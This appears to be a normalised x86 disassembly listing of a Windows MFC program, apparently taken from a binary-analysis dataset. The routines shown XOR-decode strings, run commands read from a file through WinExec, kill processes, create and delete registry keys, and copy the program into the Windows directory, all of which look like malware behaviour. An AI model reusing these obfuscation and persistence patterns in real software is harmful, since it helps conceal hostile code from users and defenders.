[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0x50 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx ebx
call sub_403700
lea edi [ ebp - 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x118 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x258 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebp - 0x118 ]
push ecx
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x24 ] eax
je r-xdata
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_665
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x1c ]
inc ecx
xor eax eax
mov [ ebp - 0x14 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0xb4 ]
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ ebp - 0xb4 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0xb4 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x22c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0xb4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ ebx + 0x190 ]
push ecx
mov ecx ebx
call sub_401d00
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_268
lea edx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
push edx
call Ordinal_MFC42_5583
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_1567
mov edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x258 ]
push ecx
push edx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
sub_402610
push 0xffffffff
push sub_40d7d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x200
push ebx
push ebp
mov ebp ecx
push esi
push edi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_354
lea ecx [ esp + 0x18 ]
mov [ esp + 0x218 ] 0x0
call Ordinal_MFC42_540
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x90 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
mov ebx 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov [ esp + 0x21c ] bl
and ecx 0x3
mov [ esp + 0x40 ] 0x4
[ edi ] [ esi ]
lea ecx [ esp + 0x94 ]
mov [ esp + 0x20 ] 0x0
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x90 ]
push edx
push 0x20019
push 0x0
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push eax
push eax
mov eax [ esp + 0x40 ]
push rw-data
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x110 ]
push 0x55
lea ecx [ ebp + 0xc0 ]
push eax
push ecx
call sub_402ed0
add esp 0xc
lea edx [ esp + 0x110 ]
lea ecx [ esp + 0x20 ]
push eax
push edx
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
lea eax [ esp + 0x110 ]
push 0x55
lea ecx [ ebp + 0xd0 ]
push eax
push ecx
call sub_402ed0
add esp 0xc
lea edx [ esp + 0x110 ]
lea ecx [ esp + 0x20 ]
push eax
push edx
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
lea eax [ esp + 0x110 ]
push 0x55
lea ecx [ ebp + 0xf0 ]
push eax
push ecx
call sub_402ed0
add esp 0xc
lea edx [ esp + 0x110 ]
lea ecx [ esp + 0x20 ]
push eax
push edx
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x40 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x44 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x40 ]
lea eax [ esp + 0x90 ]
push edx
push eax
mov ecx ebp
call sub_403750
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push eax
push 0x1001
push edx
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_5186
mov ecx [ esp + 0x30 ]
push ecx
call [ RegCloseKey@IAT ]
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x40 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x44 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x40 ]
lea eax [ esp + 0x90 ]
push edx
push eax
mov ecx ebp
call sub_403750
test eax eax
je r-xdata
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
mov ecx [ esp + 0x10 ]
push 0x5c
mov [ esp + 0x21c ] 0x6
mov esi [ ecx - 0x8 ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_5683
sub esi eax
lea edx [ esp + 0x14 ]
dec esi
lea ecx [ esp + 0x10 ]
push esi
push edx
call Ordinal_MFC42_5710
mov eax [ eax ]
or ecx 0xffffffff
mov edi eax
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x50 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_800
lea ecx [ esp + 0x110 ]
push 0x55
lea edx [ esp + 0x54 ]
push ecx
push edx
call sub_402ed0
lea edi [ esp + 0x5c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x110 ]
push ecx
push eax
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x10 ]
mov [ esp + 0x218 ] bl
call Ordinal_MFC42_800
lea ecx [ ebp + 0x620 ]
lea edx [ esp + 0x14 ]
push ecx
push rw-data
push edx
call Ordinal_MFC42_926
push rw-data
push eax
lea eax [ esp + 0x3c ]
mov [ esp + 0x220 ] 0x2
push eax
call Ordinal_MFC42_924
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x38 ]
push ecx
push eax
push edx
mov [ esp + 0x224 ] 0x3
call Ordinal_MFC42_924
push rw-data
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x220 ] 0x4
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ esp + 0x1c ]
mov [ esp + 0x21c ] 0x5
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x218 ] 0x4
call Ordinal_MFC42_800
lea ecx [ esp + 0x38 ]
mov [ esp + 0x218 ] 0x3
call Ordinal_MFC42_800
lea ecx [ esp + 0x34 ]
mov [ esp + 0x218 ] 0x2
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x218 ] bl
call Ordinal_MFC42_800
mov ecx [ esp + 0x18 ]
push 0x0
push ebx
push ecx
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x90 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x94 ]
push ecx
mov ecx ebp
call sub_403700
lea edx [ esp + 0x110 ]
push 0x55
lea eax [ esp + 0x94 ]
push edx
push eax
call sub_402ed0
add esp 0xc
lea ecx [ esp + 0x110 ]
push eax
push ecx
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_1979
lea ecx [ esp + 0x18 ]
mov [ esp + 0x218 ] 0x0
call Ordinal_MFC42_800
lea ecx [ esp + 0x20 ]
mov [ esp + 0x218 ] 0xffffffff
call Ordinal_MFC42_665
mov ecx [ esp + 0x210 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20c
retn
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_537
lea ecx [ esp + 0x14 ]
push 0x26
push ecx
lea ecx [ esp + 0x18 ]
mov [ esp + 0x220 ] 0x7
call Ordinal_MFC42_5710
mov eax [ eax ]
or ecx 0xffffffff
mov edi eax
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x50 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_800
lea ecx [ esp + 0x110 ]
push 0x55
lea edx [ esp + 0x54 ]
push ecx
push edx
call sub_402ed0
add esp 0xc
lea ecx [ esp + 0x20 ]
push eax
lea eax [ esp + 0x114 ]
push eax
call Ordinal_MFC42_6385
push ebx
push rw-data
lea ecx [ esp + 0x28 ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x10 ]
mov [ esp + 0x218 ] bl
call Ordinal_MFC42_800
sub_402bd0
push ebp
mov ebp esp
push 0xffffffff
push sub_40d838
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x130
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x10 ] esp
push rw-data
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_537
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_540
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_354
mov eax [ ebx + 0x630 ]
mov [ ebp - 0x4 ] 0x2
test eax eax
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0x13c ]
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x13c ]
push ecx
mov ecx ebx
call sub_403700
lea edx [ ebp - 0x13c ]
lea ecx [ ebp - 0x14 ]
push edx
call Ordinal_MFC42_860
lea eax [ ebx + 0x110 ]
lea ecx [ ebp - 0x18 ]
push eax
call Ordinal_MFC42_537
lea ecx [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x1c ]
push ecx
push edx
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_922
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_858
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea eax [ ebp - 0x14 ]
push rw-data
lea ecx [ ebp - 0x18 ]
push eax
push ecx
call Ordinal_MFC42_924
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_858
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea edx [ ebp - 0x14 ]
push rw-data
lea eax [ ebp - 0x18 ]
push edx
push eax
call Ordinal_MFC42_924
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_858
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x20 ]
call Ordinal_MFC42_858
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
mov [ ebp - 0x24 ] esi
je r-xdata
mov edi rw-data
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_665
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx 0x8
xor eax eax
lea edi [ ebp - 0x48 ]
push esi
[ edi ]
mov [ ebp - 0x1c ] 0x0
call [ fgetc@IAT ]
add esp 0x4
cmp al 0xff
je r-xdata
push esi
call [ fclose@IAT ]
add esp 0x4
lea ecx [ ebp - 0x28 ]
call Ordinal_MFC42_268
push rw-data
mov [ ebp - 0x4 ] 0x9
call Ordinal_MFC42_5583
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_1567
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x14 ]
push eax
mov [ ebp + edx - 0x48 ] 0x0
lea edx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x1c ] 0x0
call Ordinal_MFC42_924
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x7
call Ordinal_MFC42_858
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x48 ]
push eax
push ecx
mov ecx ebx
call sub_401e60
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call [ WinExec@IAT ]
mov edi [ ebp + 0x8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0xbc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebp - 0xbc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x48 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0xbc ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx ebx
call sub_401f10
mov esi [ ebp - 0x24 ]
mov ecx [ ebp - 0x1c ]
mov [ ebp + ecx - 0x48 ] al
inc ecx
mov [ ebp - 0x1c ] ecx
jmp r-xdata
push esi
call [ fgetc@IAT ]
add esp 0x4
cmp al 0xff
jne r-xdata
sub_402ed0
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
test ebp ebp
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
retn
mov edx [ esp + 0x14 ]
mov al [ esp + 0x18 ]
sub esi edx
mov edi ebp
mov cl [ esi + edx ]
xor cl al
mov [ edx ] cl
inc edx
dec edi
jne r-xdata
sub_402f10
sub esp 0x88
xor eax eax
lea edx [ esp + 0x8 ]
push ebx
push esi
mov ebx ecx
push edi
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx ebx
call sub_403700
lea edx [ esp + 0x10 ]
lea eax [ esp + 0xc ]
push edx
push eax
push 0x0
push 0xf003f
push 0x0
push rw-data
lea ecx [ esp + 0x2c ]
push 0x0
push ecx
push 0x80000002
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
mov [ ebx + 0x628 ] 0x0
pop esi
xor eax eax
pop ebx
add esp 0x88
retn
lea edx [ esp + 0x14 ]
push edx
push 0x80000002
call [ RegDeleteKeyA@IAT ]
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop edi
mov [ ebx + 0x628 ] eax
pop esi
pop ebx
add esp 0x88
retn
sub_402fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_40d870
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push esi
mov esi ecx
push edi
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] esp
call Ordinal_MFC42_540
xor eax eax
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
mov [ esi + 0x62c ] eax
lea eax [ esi + 0xd0 ]
push eax
call Ordinal_MFC42_537
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_858
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_800
push 0x5f
push 0x2e
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_6876
mov ecx [ ebp - 0x14 ]
lea ebx [ esi + 0x418 ]
push ebx
push ecx
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
mov ecx esi
call sub_402610
mov ecx esi
call sub_4031d0
push ebx
lea edx [ ebp - 0x50 ]
push 0x80
push edx
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
mov edi rw-data
lea eax [ ebp - 0x50 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov [ esi + 0x62c ] 0x1
mov eax [ esi + 0x628 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
mov eax [ esi + 0x62c ]
test eax eax
jne r-xdata
mov ecx esi
call sub_4032c0
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
push ebx
push rw-data
push rw-data
push rw-data
call [ WritePrivateProfileStringA@IAT ]
lea ecx [ ebp - 0x30 ]
call Ordinal_MFC42_354
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_268
push ebx
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_5583
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_1567
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_665
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push 0x7530
call [ Sleep@IAT ]
mov ecx esi
call sub_4031d0
push ebx
lea eax [ ebp - 0x50 ]
push 0x80
push eax
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
mov edi rw-data
lea eax [ ebp - 0x50 ]
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esi + 0x62c ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
sub_4031d0
sub esp 0x20
push ebx
push ebp
push esi
push edi
mov ebp ecx
call sub_403b10
lea esi [ ebp + 0x51c ]
push 0x0
push 0x0
push esi
call [ lstrlenA@IAT ]
push eax
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov edi eax
push edi
push 0x0
call [ SysAllocStringLen@IAT ]
mov ebx eax
push edi
push ebx
push esi
call [ lstrlenA@IAT ]
push eax
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
push rw-data
call sub_403ba0
add esp 0x4
test eax eax
jle r-xdata
add ebp 0x418
lea eax [ esp + 0x10 ]
push ebp
push 0x80
push eax
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ atoi@IAT ]
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
push rw-data
push ebx
push 0x1
push 0x1
push eax
call sub_403810
add esp 0x14
push ebx
call [ SysFreeString@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push rw-data
push ebx
push 0x1
push 0x1
push esi
call sub_403810
add esp 0x14
push esi
push 0x0
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0xffffffff
push esi
call [ TerminateProcess@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_4032c0
sub esp 0x28
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] esi
call sub_403b10
mov ebx [ lstrlenA@IAT ]
add esi 0x51c
push 0x0
push 0x0
push esi
call ebx
mov ebp [ MultiByteToWideChar@IAT ]
push eax
push esi
push 0x0
push 0x0
call ebp
mov edi eax
push edi
push 0x0
call [ SysAllocStringLen@IAT ]
push edi
push eax
push esi
mov [ esp + 0x1c ] eax
call ebx
push eax
push esi
push 0x0
push 0x0
call ebp
mov ebp [ GetPrivateProfileStringA@IAT ]
mov ebx rw-data
add ebx 0x20
cmp ebx rw-data
jl r-xdata
mov ecx [ esp + 0x10 ]
push rw-data
push ecx
push 0x1
push 0x1
push eax
call sub_403810
mov edi [ esp + 0x28 ]
add esp 0x14
lea eax [ esp + 0x18 ]
lea edx [ edi + 0x418 ]
push edx
push 0x80
push eax
push rw-data
push rw-data
push rw-data
call ebp
mov esi rw-data
lea eax [ esp + 0x18 ]
push ebx
call sub_403ba0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ SysFreeString@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esp + 0x10 ]
mov [ edi + 0x62c ] 0x1
push eax
call [ SysFreeString@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_403400
push 0xffffffff
push sub_40d888
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
mov esi ecx
lea ecx [ esp + 0x4 ]
call Ordinal_MFC42_354
push 0x0
lea eax [ esi + 0x51c ]
push 0x1001
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x0
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
push 0xf000
push rw-data
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x4 ]
call Ordinal_MFC42_1979
mov ecx esi
call sub_4034c0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c ] 0xffffffff
call Ordinal_MFC42_665
mov ecx [ esp + 0x14 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1c ] 0xffffffff
call Ordinal_MFC42_665
xor eax eax
pop esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
sub_4034c0
sub esp 0x264
lea eax [ esp ]
push esi
push 0x32
mov esi ecx
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x150 ]
lea edx [ esp + 0x4 ]
push ecx
push edx
call Ordinal_MFC42_3790
lea eax [ esp + 0x38 ]
add esi 0x51c
push eax
push esi
call Ordinal_MFC42_3790
test eax eax
je r-xdata
pop esi
add esp 0x264
retn
mov eax [ esp + 0x150 ]
lea ecx [ esp + 0x38 ]
push ecx
push esi
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
call Ordinal_MFC42_6153
sub_403530
sub esp 0x24
push ebx
push ebp
push esi
push edi
mov ebx ecx
call sub_403b10
mov ebp [ lstrlenA@IAT ]
lea esi [ ebx + 0x51c ]
push 0x0
push 0x0
push esi
call ebp
push eax
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov edi eax
push edi
push 0x0
call [ SysAllocStringLen@IAT ]
push edi
push eax
push esi
mov [ esp + 0x1c ] eax
call ebp
push eax
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
push rw-data
call sub_403ba0
mov edi eax
add esp 0x4
test edi edi
jle r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ SysFreeString@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
mov ebp [ GetPrivateProfileStringA@IAT ]
add ebx 0x418
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push 0x7530
call [ Sleep@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ esp + 0x10 ]
push rw-data
push eax
push 0x1
push 0x1
push edi
call sub_403810
add esp 0x14
lea ecx [ esp + 0x14 ]
push ebx
push 0x80
push ecx
push rw-data
push rw-data
push rw-data
call ebp
mov esi rw-data
lea eax [ esp + 0x14 ]
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_403630
sub esp 0xa0
xor eax eax
lea edx [ esp ]
push ebx
push esi
mov ebx ecx
push edi
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx ebx
call sub_403700
mov edi [ sprintf@IAT ]
lea edx [ esp + 0xc ]
lea esi [ ebx + 0x314 ]
push edx
push esi
lea eax [ ebx + 0x51c ]
push rw-data
push eax
call edi
add esp 0x10
lea ecx [ ebx + 0x418 ]
push rw-data
push esi
